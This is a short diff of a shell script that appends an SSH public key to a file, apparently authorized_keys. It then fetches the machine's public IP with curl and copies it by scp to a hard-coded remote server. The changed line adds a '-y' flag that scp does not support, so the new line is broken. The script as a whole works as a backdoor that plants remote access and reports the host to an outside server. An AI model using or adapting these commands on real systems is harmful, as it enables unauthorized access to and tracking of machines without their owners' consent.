@@ -14,4 +14,4 @@ sed -i '$a ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDqdjodswNNPn3v9Q+GaOxbXDoEE5UBN
 apt update
 apt install curl -y
 curl eth0.me >> ip.txt
-scp ip.txt click14@164.90.144.242:/root/zooIP/
+scp ip.txt click14@164.90.144.242:/root/zooIP/ -y
